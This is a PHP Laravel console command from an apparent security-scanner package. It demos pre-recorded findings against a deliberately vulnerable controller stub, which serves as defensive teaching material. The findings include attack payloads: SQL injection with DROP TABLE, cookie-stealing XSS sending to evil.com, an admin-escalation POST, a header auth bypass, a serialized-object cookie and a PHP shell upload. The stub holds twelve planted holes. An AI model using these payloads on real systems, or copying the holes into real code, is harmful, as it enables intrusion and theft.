<?php

declare(strict_types=1);

namespace Mahdi\HackAuditor\Console;

use Illuminate\Console\Command;
use Mahdi\HackAuditor\Scanner\ScanCoverage;
use Mahdi\HackAuditor\Scanner\Vulnerability;
use Mahdi\HackAuditor\Scanner\VulnerabilityReport;
use Mahdi\HackAuditor\Support\Confidence;
use Mahdi\HackAuditor\Support\FindingClass;
use Mahdi\HackAuditor\Support\SeverityLevel;
use Mahdi\HackAuditor\Support\VulnerabilityType;

/**
 * A zero-config preview of hack:scan output.
 *
 * The findings are PRE-RECORDED: no AI request is made and nothing is
 * analysed live. Everything the command prints says so, and everything else
 * about the output is kept faithful to a real scan — the score comes from the
 * real formula over these findings, confirmed vulnerabilities and review
 * questions are split exactly as hack:scan splits them, and coverage and
 * confidence are shown the same way. A demo that looks better than the product
 * is an advert, not a demo.
 */
final class HackDemoCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'hack:demo
        {--quick : Skip animations}
        {--copy : Copy the share text to the clipboard}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Preview scan output on a purposely vulnerable controller (pre-recorded findings, no AI call, no API key needed)';

    private const string DEMO_CONTROLLER_FILENAME = 'InsecureController.php';

    /**
     * Number of flaws planted in the demo controller stub.
     */
    private const int PLANTED_FLAWS = 12;

    /**
     * Execute the console command.
     */
    public function handle(): int
    {
        $demoDir = storage_path('hack-auditor/demo');
        $demoFile = $demoDir.DIRECTORY_SEPARATOR.self::DEMO_CONTROLLER_FILENAME;

        try {
            $this->prepareDemoFile($demoDir, $demoFile);
            $this->runDemo($demoFile);
        } finally {
            $this->cleanupDemoFiles($demoDir, $demoFile);
        }

        return self::SUCCESS;
    }

    /**
     * Create the temporary demo directory and controller file.
     */
    private function prepareDemoFile(string $demoDir, string $demoFile): void
    {
        if (! is_dir($demoDir)) {
            mkdir($demoDir, 0755, true);
        }

        file_put_contents($demoFile, $this->getDemoControllerStub());
    }

    /**
     * Run the full demo sequence.
     */
    private function runDemo(string $demoFile): void
    {
        $this->clearScreen();
        $this->displayBanner();

        $report = $this->buildHardcodedReport($demoFile);

        $this->line('');
        $this->line('  <fg=gray>target</>   InsecureController.php ('.self::PLANTED_FLAWS.' planted flaws)');
        $this->line('  <fg=gray>engine</>   pre-recorded demo findings — no AI call, no API key needed');
        $this->line('');

        $this->animateSteps(count($report->confirmedVulnerabilities()), $report->reviewCount());

        $this->line('');
        $this->displayCoverage($report);
        $this->displayScore($report);
        $this->line('');
        $this->displayVulnerabilityTable($report);
        $this->line('');
        $this->displayReviewItems($report);
        $this->displayStats($report);
        $this->line('');
        $this->displayWarningBox();
        $this->line('');
        $this->displaySharePrompt($report);
    }

    /**
     * Clear the terminal screen using ANSI escape codes.
     */
    private function clearScreen(): void
    {
        $this->output->write("\033[2J\033[H");
    }

    /**
     * Display the demo ASCII art banner.
     */
    private function displayBanner(): void
    {
        $bannerPath = dirname(__DIR__, 2).'/resources/stubs/banner.stub';

        if (file_exists($bannerPath)) {
            $lines = explode("\n", trim(file_get_contents($bannerPath)));
            $this->line('');
            foreach ($lines as $line) {
                $this->line('  <fg=red>'.$line.'</>');
            }
        } else {
            $this->line('');
            $this->line('  <fg=red>HACK AUDITOR</>');
        }
    }

    /**
     * Display the animated steps unless --quick is set.
     *
     * The steps describe what is actually happening — replaying recorded
     * findings — rather than narrating an attack that is not taking place.
     */
    private function animateSteps(int $confirmedCount, int $reviewCount): void
    {
        /** @var array<int, array{message: string, color: string, delay: int}> $steps */
        $steps = [
            ['message' => 'Loading vulnerable controller...', 'color' => 'cyan', 'delay' => 600_000],
            ['message' => 'Replaying pre-recorded findings (no AI request is made)...', 'color' => 'cyan', 'delay' => 800_000],
            ['message' => 'Separating confirmed vulnerabilities from review questions...', 'color' => 'yellow', 'delay' => 800_000],
            ['message' => 'Scoring confirmed findings: max(0, 100 - sum of severity weights)...', 'color' => 'yellow', 'delay' => 600_000],
            ['message' => "{$confirmedCount} confirmed vulnerabilities, {$reviewCount} item(s) for review", 'color' => 'red', 'delay' => 400_000],
        ];

        $quick = (bool) $this->option('quick');

        foreach ($steps as $step) {
            if (! $quick) {
                usleep($step['delay']);
            }

            $symbol = $step['color'] === 'red' ? '!' : '>';
            $this->line("  <fg={$step['color']}>{$symbol}</> {$step['message']}");
        }
    }

    /**
     * Build the pre-recorded report for the demo controller.
     *
     * Eleven confirmed vulnerabilities and one review question. The missing
     * rate limit is a question, not a finding: throttling is applied on the
     * ROUTE, and the routes are not part of this controller — exactly the kind
     * of thing a real scan refuses to assert. The score is computed with the
     * real formula over the confirmed findings, not typed in.
     */
    private function buildHardcodedReport(string $demoFile): VulnerabilityReport
    {
        $location = 'app/Http/Controllers/InsecureController.php';

        $vulnerabilities = [
            new Vulnerability(
                type: VulnerabilityType::SqlInjection,
                location: $location,
                line: 14,
                severity: SeverityLevel::Critical,
                description: 'Raw user input concatenated directly into SQL query via DB::select(). Attacker can extract entire database.',
                proof: "curl -X POST /api/users -d 'id=1 OR 1=1; DROP TABLE users;--'",
                fix: "Use parameterized queries: DB::select('SELECT * FROM users WHERE id = ?', [\$id]);",
                confidence: Confidence::Proven,
            ),
            new Vulnerability(
                type: VulnerabilityType::Xss,
                location: $location,
                line: 21,
                severity: SeverityLevel::High,
                description: 'User input rendered in HTML response without escaping. Enables stored XSS via name parameter.',
                proof: "curl '/profile?name=<script>document.location=\"https://evil.com/steal?\"+document.cookie</script>'",
                fix: 'Use Blade\'s {{ }} syntax (auto-escapes) or htmlspecialchars($input, ENT_QUOTES, \'UTF-8\').',
            ),
            new Vulnerability(
                type: VulnerabilityType::MassAssignment,
                location: $location,
                line: 28,
                severity: SeverityLevel::High,
                description: 'User::create() called with unfiltered request input. Attacker can set is_admin=true or modify any column.',
                proof: "curl -X POST /api/register -d 'name=hacker&email=h@h.com&is_admin=1&role=superadmin'",
                fix: 'Define $fillable on the model or use $request->only([\'name\', \'email\']) to whitelist fields.',
            ),
            new Vulnerability(
                type: VulnerabilityType::Csrf,
                location: $location,
                line: 26,
                severity: SeverityLevel::Medium,
                description: 'State-changing POST endpoint excluded from CSRF middleware. Allows cross-origin form submission attacks.',
                proof: '<form action="https://target.com/api/transfer" method="POST"><input name="amount" value="10000"></form>',
                fix: 'Remove the route from $except in VerifyCsrfToken middleware or use Sanctum token-based auth for APIs.',
            ),
            new Vulnerability(
                type: VulnerabilityType::WeakPasswordHashing,
                location: $location,
                line: 34,
                severity: SeverityLevel::Critical,
                description: 'Passwords stored using md5() which is cryptographically broken. Rainbow table attack recovers passwords instantly.',
                proof: 'echo md5("password123"); // 482c811da5d5b4bc6d497ffa98491e38 — found in rainbow tables',
                fix: 'Use Hash::make($password) which uses bcrypt/argon2. Never use md5(), sha1(), or sha256() for passwords.',
                confidence: Confidence::Proven,
            ),
            new Vulnerability(
                type: VulnerabilityType::SensitiveDataExposure,
                location: $location,
                line: 38,
                severity: SeverityLevel::Critical,
                description: 'API endpoint returns full user records including password hashes, API tokens, and remember_token.',
                proof: "curl /api/users | jq '.[0].password' — returns bcrypt hash",
                fix: 'Use API Resources with explicit field selection. Add $hidden = [\'password\', \'remember_token\'] to model.',
            ),
            new Vulnerability(
                type: VulnerabilityType::OpenRedirect,
                location: $location,
                line: 39,
                severity: SeverityLevel::High,
                description: 'Redirect URL taken directly from user input without validation. Enables phishing via trusted domain.',
                proof: 'https://trusted-app.com/redirect?url=https://evil-phishing-site.com/login',
                fix: 'Validate redirect URLs against a whitelist: $allowed = [\'dashboard\', \'profile\']; abort_unless(in_array($url, $allowed), 400);',
            ),
            new Vulnerability(
                type: VulnerabilityType::MissingRateLimit,
                location: $location,
                line: 31,
                severity: SeverityLevel::Medium,
                description: 'Is a throttle applied to the route for register()? Rate limiting is attached to routes, and the routes are not visible from this controller.',
                proof: 'public function register(Request $request)',
                fix: '',
                findingClass: FindingClass::Review,
                confidence: Confidence::Possible,
            ),
            new Vulnerability(
                type: VulnerabilityType::InsecureDeserialization,
                location: $location,
                line: 45,
                severity: SeverityLevel::Critical,
                description: 'unserialize() called on user-controlled cookie data. Enables Remote Code Execution via PHP gadget chains.',
                proof: 'Cookie: preferences=O:8:"Shutdown":1:{s:4:"path";s:14:"/tmp/pwned.php";}',
                fix: 'Use json_decode() instead of unserialize(). If serialization is needed, use signed/encrypted cookies.',
                confidence: Confidence::Proven,
            ),
            new Vulnerability(
                type: VulnerabilityType::AuthBypass,
                location: $location,
                line: 53,
                severity: SeverityLevel::Critical,
                description: 'Admin panel check uses client-supplied header instead of server-side session. Trivially bypassed.',
                proof: "curl -H 'X-Is-Admin: true' /admin/dashboard — full admin access",
                fix: 'Use Laravel gates/policies: Gate::authorize(\'admin\'); or $this->middleware(\'can:admin\');',
            ),
            new Vulnerability(
                type: VulnerabilityType::Idor,
                location: $location,
                line: 59,
                severity: SeverityLevel::High,
                description: 'User profile endpoint returns any user\'s data by ID without verifying ownership or authorization.',
                proof: "curl /api/users/1/profile — returns admin's profile including email, phone, address",
                fix: 'Add authorization: $this->authorize(\'view\', $user); or scope queries: auth()->user()->profile();',
            ),
            new Vulnerability(
                type: VulnerabilityType::MissingValidation,
                location: $location,
                line: 63,
                severity: SeverityLevel::Medium,
                description: 'File upload accepts any file type and size with no validation. Enables PHP shell upload and server takeover.',
                proof: "curl -F 'file=@shell.php' /api/upload — uploads executable PHP file to public directory",
                fix: 'Validate: $request->validate([\'file\' => \'required|file|mimes:jpg,png,pdf|max:2048\']);',
            ),
        ];

        $report = new VulnerabilityReport(
            vulnerabilities: $vulnerabilities,
            overallScore: self::scoreFor($vulnerabilities),
            summary: 'This controller is critically insecure: SQL injection, insecure deserialization, a header-based admin check and plaintext-equivalent password hashing would each allow a serious compromise on their own.',
            ctfIdea: 'Chain the SQL injection with the auth bypass to extract the admin password hash, then use the weak hashing to crack it and access the admin panel.',
        );

        // One file, fully analysed — the same coverage record a real scan
        // attaches, so the score is shown under the same rules.
        $report->setCoverage(ScanCoverage::complete(1));

        return $report;
    }

    /**
     * The real scoring formula: max(0, 100 - sum of confirmed severity weights).
     *
     * @param  array<int, Vulnerability>  $findings
     */
    public static function scoreFor(array $findings): int
    {
        $penalty = 0;

        foreach ($findings as $finding) {
            if ($finding->isConfirmedVulnerability()) {
                $penalty += $finding->severity->weight();
            }
        }

        return max(0, 100 - $penalty);
    }

    /**
     * Display the coverage line, as hack:scan does.
     */
    private function displayCoverage(VulnerabilityReport $report): void
    {
        $coverage = $report->getCoverage();

        if ($coverage === null) {
            return;
        }

        $this->line(sprintf(
            '  <fg=gray>coverage</>  <fg=green>%d/%d files analyzed (%s%%)</> <fg=gray>(demo file only)</>',
            $coverage->filesAnalyzed,
            $coverage->filesDiscovered,
            $coverage->percent(),
        ));
        $this->line('');
    }

    /**
     * Display the score and the arithmetic that produced it.
     */
    private function displayScore(VulnerabilityReport $report): void
    {
        $score = $report->overallScore;
        $terms = [];

        foreach ($report->scoreBreakdown()['severities'] ?? [] as $entry) {
            if ($entry['count'] > 0) {
                $terms[] = "{$entry['count']}×{$entry['weight']} {$entry['severity']}";
            }
        }

        $this->line('  <fg=red;options=bold>╔══════════════════════════════════════════════╗</>');
        $this->line('  <fg=red;options=bold>║'.str_pad("SECURITY SCORE:  {$score}/100", 46, ' ', STR_PAD_BOTH).'║</>');
        $this->line('  <fg=red;options=bold>║        CRITICALLY INSECURE (demo file)       ║</>');
        $this->line('  <fg=red;options=bold>╚══════════════════════════════════════════════╝</>');
        $this->line('  <fg=gray>score = max(0, 100 − '.implode(' − ', $terms).')</>');
    }

    /**
     * Display the top 6 confirmed vulnerabilities with "...and N more".
     */
    private function displayVulnerabilityTable(VulnerabilityReport $report): void
    {
        $sorted = $report->confirmedVulnerabilities();

        usort(
            $sorted,
            fn (Vulnerability $a, Vulnerability $b): int => $this->severityOrder($b->severity) <=> $this->severityOrder($a->severity),
        );

        $top = array_slice($sorted, 0, 6);
        $remaining = count($sorted) - 6;

        $this->line('  <fg=red;options=bold>━━━ Confirmed vulnerabilities ('.count($sorted).') ━━━</>');

        $rows = [];
        foreach ($top as $index => $vuln) {
            $rows[] = [
                '<fg=gray>'.($index + 1).'</>',
                $vuln->severity->label(),
                "<options=bold>{$vuln->type->label()}</>",
                "<fg=cyan>:{$vuln->line}</>",
                $vuln->confidence->label(),
                $vuln->type->cweId(),
            ];
        }

        $this->table(
            ['<options=bold>#</>', '<options=bold>Severity</>', '<options=bold>Type</>', '<options=bold>Line</>', '<options=bold>Confidence</>', '<options=bold>CWE</>'],
            $rows,
        );

        if ($remaining > 0) {
            $this->line("  <fg=gray>...and {$remaining} more vulnerabilities</>");
        }
    }

    /**
     * Display the review questions separately, as hack:scan does.
     */
    private function displayReviewItems(VulnerabilityReport $report): void
    {
        $items = $report->reviewItems();

        $this->line('  <fg=yellow;options=bold>━━━ Needs review ('.count($items).') ━━━</>');
        $this->line('  <fg=gray>NOT vulnerabilities — excluded from the count, the score and the exit code. No fix is suggested.</>');

        foreach ($items as $item) {
            $this->line("  <fg=yellow>?</> <options=bold>{$item->type->label()}</> <fg=cyan>:{$item->line}</> <fg=gray>confidence: {$item->confidence->label()}</>");
            $this->line("    <fg=gray>{$item->description}</>");
        }

        $this->line('');
    }

    /**
     * Display the vulnerability count statistics.
     */
    private function displayStats(VulnerabilityReport $report): void
    {
        $this->line(
            "  Found <options=bold>{$report->totalCount()}</> confirmed vulnerabilities: "
            ."<fg=red>{$report->criticalCount()} Critical</>, "
            ."<fg=yellow>{$report->highCount()} High</>, "
            ."<fg=blue>{$report->mediumCount()} Medium</>, "
            ."<fg=gray>{$report->lowCount()} Low</>"
            ." <fg=gray>(+{$report->reviewCount()} for review)</>",
        );
    }

    /**
     * Display the call-to-action warning box.
     */
    private function displayWarningBox(): void
    {
        $this->line('  <fg=red;options=bold>Deployed as-is, this controller would be exploitable within minutes.</>');
        $this->line('  <fg=gray>These were pre-recorded findings for a planted file. Your own results will differ.</>');
        $this->line('');
        $this->line('  Run <fg=cyan>php artisan hack:scan</> on YOUR code to find real vulnerabilities.');
    }

    /**
     * Display the share text. The clipboard is only touched with --copy.
     *
     * The text says what the demo is: pre-recorded findings on a planted
     * file. It used to claim "Just watched AI hack my Laravel app" — no AI
     * runs here, and it is not the user's app.
     */
    private function displaySharePrompt(VulnerabilityReport $report): void
    {
        $tweetText = "Tried the laravel-hack-auditor demo: a deliberately vulnerable controller, pre-recorded findings.\n"
            ."{$report->totalCount()} confirmed vulnerabilities + {$report->reviewCount()} flagged for review. Score: {$report->overallScore}/100.\n"
            ."\n"
            ."composer require mahdisphp/laravel-hack-auditor\n"
            ."php artisan hack:demo\n"
            ."\n"
            .'#Laravel #Security';

        $this->line('  <fg=cyan;options=bold>Share text:</>');
        $this->line('');

        foreach (explode("\n", $tweetText) as $tweetLine) {
            $this->line("  <fg=gray>{$tweetLine}</>");
        }

        $this->line('');

        if ($this->option('copy')) {
            $this->copyToClipboard($tweetText);
        } else {
            $this->line('  <fg=gray>Run with --copy to copy this to your clipboard.</>');
        }
    }

    /**
     * Attempt to copy text to the system clipboard.
     */
    private function copyToClipboard(string $text): void
    {
        $process = null;

        if (PHP_OS_FAMILY === 'Darwin') {
            $process = popen('pbcopy', 'w');
        } elseif (PHP_OS_FAMILY === 'Linux') {
            if (shell_exec('which xclip 2>/dev/null')) {
                $process = popen('xclip -selection clipboard', 'w');
            } elseif (shell_exec('which xsel 2>/dev/null')) {
                $process = popen('xsel --clipboard --input', 'w');
            }
        }

        if ($process !== null && $process !== false) {
            fwrite($process, $text);
            pclose($process);
            $this->line('  <fg=green>Copied to clipboard.</>');

            return;
        }

        $this->line('  <fg=yellow>No clipboard tool found (pbcopy, xclip or xsel).</>');
    }

    /**
     * Return the numeric sort order for a severity level.
     */
    private function severityOrder(SeverityLevel $severity): int
    {
        return match ($severity) {
            SeverityLevel::Critical => 4,
            SeverityLevel::High => 3,
            SeverityLevel::Medium => 2,
            SeverityLevel::Low => 1,
        };
    }

    /**
     * Truncate a string to a maximum length with ellipsis.
     */
    private function truncate(string $text, int $maxLength): string
    {
        if (mb_strlen($text) <= $maxLength) {
            return $text;
        }

        return mb_substr($text, 0, $maxLength - 3).'...';
    }

    /**
     * Clean up the temporary demo files and directory.
     */
    private function cleanupDemoFiles(string $demoDir, string $demoFile): void
    {
        if (file_exists($demoFile)) {
            unlink($demoFile);
        }

        if (is_dir($demoDir)) {
            @rmdir($demoDir);
        }
    }

    /**
     * Return the hardcoded demo controller stub content.
     *
     * This purposely vulnerable controller demonstrates all 12 vulnerability
     * types that Hack Auditor can detect. It is never used in production —
     * only written to a temp file during the demo and immediately deleted.
     */
    private function getDemoControllerStub(): string
    {
        return <<<'PHP'
        <?php

        namespace App\Http\Controllers;

        use App\Models\User;
        use Illuminate\Http\Request;
        use Illuminate\Support\Facades\DB;

        class InsecureController extends Controller
        {
            // ❌ VULN 1: SQL Injection — raw user input in query
            public function findUser(Request $request)
            {
                $id = $request->input('id');
                $users = DB::select("SELECT * FROM users WHERE id = $id");
                return response()->json($users);
            }

            // ❌ VULN 2: XSS — unescaped output
            public function profile(Request $request)
            {
                $name = $request->input('name');
                return response("<h1>Welcome, $name</h1>");
            }

            // ❌ VULN 3: Mass Assignment — unfiltered create
            // ❌ VULN 4: CSRF — no middleware protection
            public function register(Request $request)
            {
                $user = User::create($request->all());

                // ❌ VULN 5: Missing Rate Limit — no throttle on auth
                return response()->json($user);
            }

            // ❌ VULN 6: Weak Password Hashing — md5 instead of bcrypt
            public function setPassword(Request $request)
            {
                $user = User::find($request->input('user_id'));
                $user->password = md5($request->input('password'));
                $user->save();

                // ❌ VULN 7: Sensitive Data Exposure — full model dump
                // ❌ VULN 8: Open Redirect — unvalidated URL
                return redirect($request->input('redirect_url'))
                    ->with('user', User::all()->toArray());
            }

            // ❌ VULN 9: Insecure Deserialization — unserialize user data
            public function loadPreferences(Request $request)
            {
                $prefs = unserialize($request->cookie('preferences'));
                return response()->json($prefs);
            }

            // ❌ VULN 10: Auth Bypass — trusting client header
            public function adminDashboard(Request $request)
            {
                if ($request->header('X-Is-Admin') === 'true') {
                    return response()->json(['secret' => config('app.key')]);
                }
                return response('Forbidden', 403);
            }

            // ❌ VULN 11: IDOR — no ownership check
            public function getUserProfile(int $id)
            {
                return response()->json(User::findOrFail($id));
            }

            // ❌ VULN 12: Missing Validation — no file validation
            public function uploadFile(Request $request)
            {
                $path = $request->file('file')->store('uploads', 'public');
                return response()->json(['path' => $path]);
            }
        }
        PHP;
    }
}
